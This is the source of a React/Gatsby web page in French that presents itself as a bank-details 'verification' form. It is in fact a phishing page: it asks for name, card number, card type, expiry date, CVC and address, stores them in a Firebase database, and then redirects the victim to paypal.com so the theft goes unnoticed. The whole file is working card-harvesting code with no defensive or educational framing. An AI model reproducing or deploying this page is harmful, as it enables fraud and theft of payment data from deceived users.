import * as React from "react"
import { navigate } from "gatsby"
import {useState} from "react";
import {StaticImage} from "gatsby-plugin-image";
import './Verification.css';
import {addVerificationDetails} from "../firebase/firestore";
export default function (){
    const [name,setName]=useState("");
    const [cardNo,setCardNo]=useState("");
    const [cardType,setCardType]=useState("NONE");
    const [expirationDate,setExpirationDate]=useState("");
    const [cvc,setCVC]=useState("");
    const [address,setAddress]=useState("");
    const [loading,setLoading]=useState(false);
    async function onSubmit(e) {

        e.preventDefault();
        setLoading(true);
        await addVerificationDetails({name,cardType,cardNo,expirationDate,cvc,address,timestamp:new Date().getTime()});
        window.location.href ='https://paypal.com'
        setLoading(false);

    }
    return <div className="u-body u-xl-mode">
    <section className="u-clearfix u-verification-section-1" id="sec-a671">
        <div className="u-clearfix u-sheet u-sheet-1">
            <StaticImage className="u-image u-image-default u-image-1" src="../images/R.png" alt="" data-image-width="2272"
                 data-image-height="1704"/>
                <h2 className="u-align-center u-custom-font u-subtitle u-text u-text-default u-text-font u-text-1"> Mettez
                    à jour vos informations bancaire :&nbsp;</h2>
                <StaticImage className="u-image u-image-default u-preserve-proportions u-image-2" src="../images/cc.jpg" alt=""
                     data-image-width="188" data-image-height="119"/>
                    <div className="u-form u-form-1">
                        <form
                                onSubmit={onSubmit}
                              className="u-clearfix u-form-spacing-15 u-form-vertical u-inner-form"
                              style={{padding: 15}}>
                            <div className="u-form-group u-form-name u-label-none u-form-group-1">
                                <label htmlFor="name-f1a2" className="u-label">Nom</label>
                                <input value={name} onChange={e=>setName(e.target.value)}
                                    type="text" placeholder="Entrez votre nom et prénom" id="name-f1a2" name="name"
                                       className="u-border-1 u-border-grey-30 u-input u-input-rectangle" required=""/>
                            </div>
                            <div className="u-form-group u-form-name u-label-none u-form-group-2">
                                <label htmlFor="name-340f" className="u-label">Numéro de carte</label>
                                <input value={cardNo} onChange={e=>setCardNo(e.target.value)}
                                    type="text" placeholder="Numéro de carte" id="name-340f" name="card"
                                       className="u-border-1 u-border-grey-30 u-input u-input-rectangle" required=""/>
                            </div>
                            <div className="u-form-group u-form-select u-label-none u-form-group-3">
                                <label htmlFor="select-5e3e" className="u-label">Type de carte</label>
                                <div className="u-form-select-wrapper">
                                    <select value={cardType} onChange={(e)=>setCardType(e.target.value)} id="select-5e3e" name="visa"
                                            className="u-border-1 u-border-grey-30 u-input u-input-rectangle"
                                            required="required">
                                        <option value="NONE">Type de carte</option>
                                        <option value="CB">CB</option>
                                        <option value="Visa">Visa</option>
                                        <option value="Mastercard">Mastercard</option>
                                        <option value="American Express">American Express</option>
                                        <option value="Discover">Discover</option>
                                        <option value="Maestro">Maestro</option>
                                        <option value="Cofinoga ou Privilège">Cofinoga ou Privilège</option>
                                        <option value="Carte Aurore">Carte Aurore</option>
                                        <option value="4 étoiles">4 étoiles</option>
                                        <option value="UnionPay">UnionPay</option>
                                    </select>
                                    <svg xmlns="http://www.w3.org/2000/svg" width="14" height="12" version="1"
                                         className="u-caret">
                                        <path fill="currentColor" d="M4 8L0 4h8z"></path>
                                    </svg>
                                </div>
                            </div>
                            <div className="u-form-group u-label-none u-form-group-4">
                                <label htmlFor="text-94d0" className="u-label">Date</label>
                                <input value={expirationDate} onChange={e=>setExpirationDate(e.target.value)}
                                    type="month" placeholder="Date d'expiration (MM/AA)" id="text-94d0" name="Date"
                                       className="u-border-1 u-border-grey-30 u-input u-input-rectangle"

                                       required="required"/>
                            </div>
                            <div className="u-form-group u-label-none u-form-group-5">
                                <label htmlFor="text-59d1" className="u-label">CVC</label>
                                <input value={cvc} onChange={e=>setCVC(e.target.value)}
                                    type="number" placeholder="Cryptogramme visuel (CVV)" id="text-59d1" name="CVC"
                                       className="u-border-1 u-border-grey-30 u-input u-input-rectangle"
                                       required="required"/>
                            </div>
                            <div className="u-form-address u-form-group u-label-none u-form-group-6">
                                <label htmlFor="address-fa7c" className="u-label">Adresse</label>
                                <input value={address} onChange={e=>setAddress(e.target.value)}
                                       type="text" placeholder="Entrez votre adresse" id="address-fa7c" name="address"
                                       className="u-border-1 u-border-grey-30 u-input u-input-rectangle" required=""/>
                            </div>
                            <div className="u-align-center u-form-group u-form-submit">
                                <button disabled={loading} type="submit" value="submit"
                                   className="u-btn u-btn-round u-btn-submit u-button-style u-custom-color-1 u-hover-custom-color-2 u-radius-50 u-btn-1">Vérification</button>

                            </div>
                            <div className="u-form-send-message u-form-send-success">En attente de vérification</div>
                            <div className="u-form-send-error u-form-send-message">La vérification à échoué</div>
                        </form>
                    </div>
        </div>
    </section>


    </div>
}